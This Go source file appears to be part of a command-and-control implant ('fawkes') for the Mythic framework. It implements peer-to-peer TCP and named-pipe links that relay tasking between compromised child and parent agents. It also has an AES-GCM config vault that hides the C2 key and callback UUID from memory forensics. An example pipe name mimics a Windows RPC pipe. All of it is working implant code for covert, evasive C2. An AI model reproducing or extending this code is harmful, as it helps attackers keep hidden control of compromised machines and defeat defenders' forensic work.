package tcp

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"

	"fawkes/pkg/structs"
)

// configVault holds AES-256-GCM encrypted C2 configuration for memory forensics defense.
type configVault struct {
	key  []byte // AES-256-GCM key (random, generated at SealConfig)
	blob []byte // Encrypted JSON of sensitiveConfig
}

// sensitiveConfig holds fields that should not persist as plaintext in memory.
type sensitiveConfig struct {
	EncryptionKey string `json:"k"`
	CallbackUUID  string `json:"c"`
}

// TCPProfile handles TCP or named pipe P2P communication with a parent agent or Mythic (via linked egress agent).
// In P2P mode, this agent does NOT talk to Mythic directly — it sends/receives through a parent agent.
type TCPProfile struct {
	BindAddress   string // Address to listen on (e.g., "0.0.0.0:7777") — TCP listener mode
	PipeName      string // Named pipe name (e.g., "msrpc-f9a1") — named pipe listener mode (Windows only)
	EncryptionKey string // Base64-encoded AES key (zeroed after SealConfig)
	Debug         bool

	CallbackUUID string // Set after checkin (zeroed after SealConfig)

	vault *configVault // Encrypted config vault (set by SealConfig)

	// Parent connection (this agent connects to parent, or parent connects to us)
	parentConn net.Conn
	parentMu   sync.Mutex

	// Child connections (agents that linked to us)
	childConns map[string]net.Conn // UUID → connection
	childMu    sync.RWMutex

	// Channels for delegate message routing
	InboundDelegates  chan structs.DelegateMessage      // Messages from child agents → forward to parent/Mythic
	OutboundDelegates chan []structs.DelegateMessage    // Messages from parent/Mythic → route to child agents
	EdgeMessages      chan structs.P2PConnectionMessage // Edge add/remove notifications

	// UUID mapping for staging (temp UUID → Mythic UUID)
	uuidMapping map[string]string
	uuidMu      sync.RWMutex

	// Listener for incoming P2P connections
	listener net.Listener

	// Relink support: stored checkin data so child can re-checkin with a new parent
	cachedCheckinData []byte // base64-encoded checkin message (UUID + encrypted body)
	needsParent       bool   // set when parent disconnects; next accepted connection becomes parent
	needsParentMu     sync.Mutex
	parentReady       chan struct{} // signaled when a new parent connection is established
}

// NewTCPProfile creates a new TCP profile for P2P communication.
// pipeName is optional — if set, the agent listens on a Windows named pipe instead of TCP.
func NewTCPProfile(bindAddress, encryptionKey string, debug bool, pipeName ...string) *TCPProfile {
	p := &TCPProfile{
		BindAddress:       bindAddress,
		EncryptionKey:     encryptionKey,
		Debug:             debug,
		childConns:        make(map[string]net.Conn),
		InboundDelegates:  make(chan structs.DelegateMessage, 100),
		OutboundDelegates: make(chan []structs.DelegateMessage, 100),
		EdgeMessages:      make(chan structs.P2PConnectionMessage, 20),
		uuidMapping:       make(map[string]string),
		parentReady:       make(chan struct{}, 1),
	}
	if len(pipeName) > 0 {
		p.PipeName = pipeName[0]
	}
	return p
}

// resolveUUID maps a temporary UUID to its Mythic-assigned UUID if mapping exists.
func (t *TCPProfile) resolveUUID(uuid string) string {
	t.uuidMu.RLock()
	defer t.uuidMu.RUnlock()
	if mapped, ok := t.uuidMapping[uuid]; ok {
		return mapped
	}
	return uuid
}

// GetCallbackUUID returns the callback UUID assigned by Mythic after checkin.
func (t *TCPProfile) GetCallbackUUID() string {
	if t.vault != nil {
		cfg := t.getConfig()
		if cfg != nil {
			return cfg.CallbackUUID
		}
		return ""
	}
	return t.CallbackUUID
}

// SealConfig encrypts EncryptionKey and CallbackUUID into an AES-256-GCM vault
// and zeros the plaintext struct fields.
func (t *TCPProfile) SealConfig() error {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("config vault key generation failed: %w", err)
	}

	cfg := &sensitiveConfig{
		EncryptionKey: t.EncryptionKey,
		CallbackUUID:  t.CallbackUUID,
	}

	plaintext, err := json.Marshal(cfg)
	if err != nil {
		vaultZeroBytes(key)
		return fmt.Errorf("config vault marshal failed: %w", err)
	}

	blob := vaultEncrypt(key, plaintext)
	vaultZeroBytes(plaintext)
	if blob == nil {
		vaultZeroBytes(key)
		return fmt.Errorf("config vault encryption failed")
	}

	t.vault = &configVault{key: key, blob: blob}

	// Zero plaintext struct fields
	t.EncryptionKey = ""
	t.CallbackUUID = ""

	return nil
}

// getConfig returns the current config from the vault or plaintext fields.
func (t *TCPProfile) getConfig() *sensitiveConfig {
	if t.vault == nil {
		return &sensitiveConfig{
			EncryptionKey: t.EncryptionKey,
			CallbackUUID:  t.CallbackUUID,
		}
	}

	plaintext := vaultDecrypt(t.vault.key, t.vault.blob)
	if plaintext == nil {
		return nil
	}

	var cfg sensitiveConfig
	if err := json.Unmarshal(plaintext, &cfg); err != nil {
		vaultZeroBytes(plaintext)
		return nil
	}
	vaultZeroBytes(plaintext)
	return &cfg
}

// UpdateCallbackUUID updates the callback UUID in the vault or struct field.
func (t *TCPProfile) UpdateCallbackUUID(uuid string) {
	if t.vault == nil {
		t.CallbackUUID = uuid
		return
	}
	cfg := t.getConfig()
	if cfg == nil {
		return
	}
	cfg.CallbackUUID = uuid
	plaintext, err := json.Marshal(cfg)
	if err != nil {
		return
	}
	blob := vaultEncrypt(t.vault.key, plaintext)
	vaultZeroBytes(plaintext)
	if blob != nil {
		t.vault.blob = blob
	}
}

// getEncryptionKey returns the encryption key from the vault or struct field.
func (t *TCPProfile) getEncryptionKey() string {
	if t.vault != nil {
		cfg := t.getConfig()
		if cfg != nil {
			return cfg.EncryptionKey
		}
		return ""
	}
	return t.EncryptionKey
}

func (t *TCPProfile) getActiveUUID(agent *structs.Agent) string {
	uuid := t.GetCallbackUUID()
	if uuid != "" {
		return uuid
	}
	return agent.PayloadUUID
}

// --- Vault encryption helpers (AES-256-GCM) ---

func vaultEncrypt(key, plaintext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil
	}
	return gcm.Seal(nonce, nonce, plaintext, nil)
}

func vaultDecrypt(key, blob []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	nonceSize := gcm.NonceSize()
	if len(blob) < nonceSize {
		return nil
	}
	nonce, ciphertext := blob[:nonceSize], blob[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil
	}
	return plaintext
}

func vaultZeroBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}
